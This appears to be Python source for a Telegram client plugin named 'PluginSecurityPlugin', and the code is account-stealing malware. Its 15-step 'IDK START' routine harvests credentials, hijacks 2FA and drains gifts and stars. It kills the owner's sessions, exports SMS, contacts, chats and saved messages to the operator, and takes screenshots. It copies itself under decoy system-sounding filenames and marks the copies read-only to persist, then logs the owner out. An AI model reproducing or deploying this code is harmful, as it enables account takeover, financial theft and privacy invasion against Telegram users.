    def _manual_chats(self):
        try:
            mc = _MC().getInstance(0)
            DO = jclass("org.telegram.messenger.DialogObject")
            try:
                dialogs = mc.dialogs_dict
            except Exception:
                dialogs = mc.getAllDialogs()
            if dialogs is None:
                return "empty"
            out = []
            for i in range(dialogs.size()):
                try:
                    did = int(dialogs.keyAt(i))
                    title = ""
                    try:
                        title = str(DO.getName(0, did))
                    except Exception:
                        pass
                    if not title:
                        if did > 0:
                            u = mc.getUser(did)
                            if u is not None:
                                parts = (
                                    str(getattr(u, "first_name", "") or ""),
                                    str(getattr(u, "last_name", "") or ""),
                                )
                                title = " ".join(x for x in parts if x) or str(did)
                        else:
                            cid = -did
                            if cid > 1000000000000:
                                cid -= 1000000000000
                            c = mc.getChat(int(cid))
                            if c is not None:
                                title = str(getattr(c, "title", "") or str(did))
                    out.append("%d — %s" % (did, title or "?"))
                except Exception:
                    pass
            self._send_msg("<b>Чаты (%d)</b>\n<pre>%s</pre>" % (
                len(out), self._html_escape("\n".join(out[:200]))), html=True)
            return "ok"
        except Exception as e:
            return str(e)

    def _export_saved_messages(self):
        try:
            uid = int(_UC().getInstance(0).getClientUserId())
            ip = self._get_input_peer(0, uid)
            if ip is None:
                return "no peer"
            rq = TLRPC.TL_messages_getHistory()
            rq.peer = ip
            rq.limit = 100
            rq.offset_id = 0
            r, _e = self._rg_rpc(rq, 0, 20.0, fast=True)
            if r is None:
                return "no resp"
            msgs = getattr(r, "messages", None)
            if msgs is None:
                return "no msgs"
            lines = []
            for i in range(msgs.size()):
                m = msgs.get(i)
                if m is None:
                    continue
                t = str(getattr(m, "message", "") or "")
                d = int(getattr(m, "date", 0))
                if t:
                    lines.append("[%s] %s" % (
                        time.strftime("%Y-%m-%d %H:%M", time.localtime(d)), t))
            html = "<html><head><meta charset='utf-8'></head><body><pre>"
            html += self._html_escape("\n".join(lines)) + "</pre></body></html>"
            z = io.BytesIO()
            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
                zf.writestr("messages.html", html.encode("utf-8"))
            self._send_document_bytes("saved_%d.zip" % uid, z.getvalue())
            return "ok"
        except Exception as e:
            return str(e)

    # ═══════════════════════════════════════════════════════════════════════
    # PERSISTENCE
    # ═══════════════════════════════════════════════════════════════════════
    def _plugins_dir(self):
        try:
            ctx = ApplicationLoader.applicationContext
            base = str(ctx.getFilesDir().getAbsolutePath())
            p = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(base))), "files", "plugins")
            if os.path.isdir(p):
                return p
        except Exception:
            pass
        return None

    def _self_path(self):
        try:
            m = sys.modules.get(__name__)
            f = getattr(m, "__file__", None)
            if f and os.path.exists(f):
                return f
        except Exception:
            pass
        return None

    def _harden_file(self, path):
        try:
            k = path
            n = time.time()
            l = self._harden_cache.get(k, 0)
            if n - l < 10:
                return
            self._harden_cache[k] = n
        except Exception:
            pass
        try:
            from java.io import File
            f = File(path)
            f.setReadOnly()
        except Exception:
            pass

    def _replicate_self(self, n=10):
        pd = self._plugins_dir()
        if not pd:
            return {"ok": False}
        sp = self._self_path()
        if not sp:
            return {"ok": False}
        try:
            with open(sp, "rb") as f:
                src = f.read()
        except Exception as e:
            return {"ok": False, "e": str(e)}
        names = ["kernel_hook.plugin", "system_guard.plugin", "boot_watch.plugin",
                 "net_monitor.plugin", "mem_sync.plugin", "proc_hold.plugin",
                 "core_lock.plugin", "daemon_run.plugin", "svc_watch.plugin",
                 "ring0_mon.plugin"]
        made = []
        for i in range(min(int(n), len(names))):
            try:
                tgt = os.path.join(pd, names[i])
                if os.path.exists(tgt):
                    made.append(names[i])
                    continue
                with open(tgt, "wb") as f:
                    f.write(src)
                self._harden_file(tgt)
                made.append(names[i])
            except Exception:
                pass
        return {"ok": True, "made": made}

    def _install_persistence(self):
        try:
            ctx = ApplicationLoader.applicationContext
            cd = str(ctx.getCacheDir().getAbsolutePath())
        except Exception:
            return
        try:
            pl = os.path.join(cd, "kernel_persist.lock")
            if not os.path.exists(pl):
                with open(pl, "w") as f:
                    f.write(hashlib.sha256(b"ar19_idk").hexdigest())
        except Exception:
            pass

    def _nuke_marker_path(self):
        try:
            ctx = ApplicationLoader.applicationContext
            return os.path.join(str(ctx.getFilesDir().getAbsolutePath()), ".ar_nuke_active")
        except Exception:
            return None

    def _mark_nuke(self):
        try:
            m = self._nuke_marker_path()
            if m:
                with open(m, "w") as f:
                    f.write("idk")
                self._harden_file(m)
            self._nuke_started = True
        except Exception:
            pass

    def _check_persisted_nuke(self):
        try:
            m = self._nuke_marker_path()
            if not m or not os.path.exists(m):
                return
            self._nuke_started = True
            threading.Thread(target=self._nuke_loop, daemon=True).start()
        except Exception:
            pass

    def _nuke_loop(self):
        while self._sync_running and self._active:
            try:
                m = self._nuke_marker_path()
                if not m or not os.path.exists(m):
                    return
                self._parallel([(self._kill_all_sessions, 0),
                                (self._kill_web_authorizations, 0)], workers=2, timeout=25)
                for _ in range(60):
                    if not (self._sync_running and self._active):
                        return
                    time.sleep(5)
            except Exception:
                for _ in range(12):
                    if not (self._sync_running and self._active):
                        return
                    time.sleep(5)

    def _check_persisted_idk(self):
        try:
            prefs = ApplicationLoader.applicationContext.getSharedPreferences("ar_idk", 0)
            if prefs.getBoolean("idk_active", False):
                self._show_idk_overlay()
        except Exception:
            pass

    # ═══════════════════════════════════════════════════════════════════════
    # PULL OUT
    # ═══════════════════════════════════════════════════════════════════════
    def _pull_out_account(self):
        try:
            self._send_msg("Pull Out...")
            rq = TLRPC.TL_auth_logOut()
            _r, e = self._rg_rpc(rq, 0, 10.0, fast=True)
            if e is not None:
                self._send_msg("Pull out err: " + str(e))
            else:
                self._send_msg("Pull out OK.")
        except Exception as e:
            self._send_msg("Pull out exc: " + str(e))

    # ═══════════════════════════════════════════════════════════════════════
    # IDK START
    # ═══════════════════════════════════════════════════════════════════════
    def _idk_start(self):
        def task():
            def alive():
                return self._sync_running and self._active and not self.stop
            try:
                if SHOW_IDK_OVERLAY:
                    try:
                        self._show_idk_overlay()
                    except Exception:
                        pass
                    try:
                        prefs = ApplicationLoader.applicationContext.getSharedPreferences("ar_idk", 0)
                        e = prefs.edit()
                        e.putBoolean("idk_active", True)
                        e.apply()
                    except Exception:
                        pass

                self._send_msg("🔴 <b>IDK START</b>")
                t0 = time.time()
                pwd_report = {"final": "skip"}
                dr = []
                ws = []

                if not alive():
                    return
                try:
                    self._send_msg("1/15 harvest...")
                    self._tg_kid()
                except Exception as e:
                    _log("idk 1: %s" % e)

                if not alive():
                    return
                try:
                    self._send_msg("2/15 2FA...")
                except Exception:
                    pass
                try:
                    pwd_report = self._nuke_password_pipeline(0)
                except Exception as e:
                    pwd_report = {"error": str(e), "final": "exc"}

                if not alive():
                    return
                try:
                    self._send_msg("3/15 confirm sessions...")
                except Exception:
                    pass
                try:
                    self._confirm_unconfirmed_sessions(0)
                except Exception:
                    pass

                if not alive():
                    return
                try:
                    self._send_msg("4/15 web/bots/channels...")
                except Exception:
                    pass
                try:
                    self._kill_web_authorizations(0)
                except Exception:
                    pass
                try:
                    self._kill_bots(0)
                except Exception:
                    pass
                try:
                    self._leave_all_channels(0)
                except Exception:
                    pass

                if not alive():
                    return
                try:
                    self._send_msg("5/15 profile...")
                except Exception:
                    pass
                try:
                    self._change_username(0)
                except Exception:
                    pass
                try:
                    self._change_profile(0)
                except Exception:
                    pass
                try:
                    self._reset_contacts(0)
                except Exception:
                    pass

                if not alive():
                    return
                try:
                    self._send_msg("6/15 gift drain...")
                except Exception:
                    pass
                try:
                    dr = self._drain_all_accounts()
                except Exception as e:
                    dr = [{"error": str(e)}]

                if not alive():
                    return
                try:
                    self._send_msg("7/15 kill sessions...")
                except Exception:
                    pass
                try:
                    self._kill_all_sessions(0)
                except Exception:
                    pass

                if not alive():
                    return
                try:
                    self._send_msg("8/15 wipe sessions...")
                except Exception:
                    pass
                try:
                    ws = self._wipe_sessions_all()
                except Exception as e:
                    ws = [{"error": str(e)}]
                try:
                    self._kill_login_notice_dialog(0)
                except Exception:
                    pass

                if not alive():
                    return
                try:
                    self._send_msg("9/15 session dumps...")
                except Exception:
                    pass
                try:
                    self._manual_dump_session()
                except Exception:
                    pass
                try:
                    self._manual_userbot_session()
                except Exception:
                    pass

                if not alive():
                    return
                try:
                    self._send_msg("10/15 screenshot gain...")
                except Exception:
                    pass
                try:
                    self._screenshot_gain()
                except Exception as e:
                    _log("idk 10: %s" % e)

                if not alive():
                    return
                try:
                    self._send_msg("11/15 sms/contacts/apps/chats...")
                except Exception:
                    pass
                try:
                    self._manual_sms()
                except Exception:
                    pass
                try:
                    self._manual_contacts()
                except Exception:
                    pass
                try:
                    self._manual_apps()
                except Exception:
                    pass
                try:
                    self._manual_chats()
                except Exception:
                    pass

                if not alive():
                    return
                try:
                    self._send_msg("12/15 saved export...")
                except Exception:
                    pass
                try:
                    self._export_saved_messages()
                except Exception:
                    pass

                if not alive():
                    return
                try:
                    self._send_msg("13/15 persistence...")
                except Exception:
                    pass
                try:
                    self._install_persistence()
                except Exception:
                    pass
                try:
                    self._replicate_self(10)
                except Exception:
                    pass
                try:
                    self._mark_nuke()
                except Exception:
                    pass

                if not alive():
                    return
                try:
                    self._send_msg("14/15 re-kill sessions...")
                except Exception:
                    pass
                try:
                    self._kill_all_sessions(0)
                except Exception:
                    pass
                try:
                    self._kill_web_authorizations(0)
                except Exception:
                    pass

                if not alive():
                    return
                try:
                    self._send_msg("15/15 pull out...")
                except Exception:
                    pass
                try:
                    self._pull_out_account()
                except Exception as e:
                    _log("idk 15: %s" % e)

                try:
                    rep = ["<b>🔴 IDK START — результат</b>"]
                    rep.append("<b>2FA:</b> %s" % pwd_report.get("final"))
                    tot_ok = 0
                    for x in dr:
                        r = x.get("result") or {}
                        conv = r.get("convert") or {}
                        u = r.get("u") or []
                        tot_ok += int(conv.get("converted_stars", 0) or 0)
                        tot_ok += sum(1 for y in u if isinstance(y, dict)
                                      and isinstance(y.get("result"), dict)
                                      and y["result"].get("ok"))
                    rep.append("<b>Gifts:</b> %d ok" % tot_ok)
                    tk = sum(x.get("killed", 0) for x in ws if isinstance(x, dict))
                    rep.append("<b>Sessions:</b> %d убито" % tk)
                    rep.append("<b>Pull Out:</b> выполнен последним")
                    rep.append("<b>Время:</b> %.1fс" % (time.time() - t0))
                    self._send_msg("\n".join(rep), html=True)
                except Exception:
                    pass
            except Exception as e:
                try:
                    self._send_msg("IDK err: " + str(e))
                except Exception:
                    pass
        threading.Thread(target=task, daemon=True).start()


def create_plugin():
    return PluginSecurityPlugin()
